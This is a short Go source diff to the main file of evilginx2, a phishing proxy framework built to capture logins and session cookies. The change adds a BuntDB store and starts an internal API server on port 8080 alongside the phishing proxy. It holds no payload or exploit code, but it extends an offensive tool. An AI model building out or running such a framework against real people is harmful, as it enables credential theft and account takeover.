@@ -1,6 +1,7 @@
 package main
 
 import (
+	"context"
 	"flag"
 	"fmt"
 	_log "log"
@@ -12,6 +13,8 @@ import (
 	"github.com/caddyserver/certmagic"
 	"github.com/kgretzky/evilginx2/core"
 	"github.com/kgretzky/evilginx2/database"
+	"github.com/kgretzky/evilginx2/internal/api"
+	"github.com/kgretzky/evilginx2/internal/storage"
 	"github.com/kgretzky/evilginx2/log"
 	"go.uber.org/zap"
 
@@ -172,6 +175,19 @@ func main() {
 
 	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
 	hp.Start()
+
+	storageDB, err := storage.NewBuntDBStorage(filepath.Join(*cfg_dir, "api.db"))
+	if err != nil {
+		log.Error("failed to create storage: %v", err)
+	} else {
+		apiServer := api.NewServer(storageDB, nil, "8080", nil)
+		go func() {
+			ctx := context.Background()
+			if err := apiServer.Start(ctx); err != nil {
+				log.Error("API server failed: %v", err)
+			}
+		}()
+	}
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
 	if err != nil {
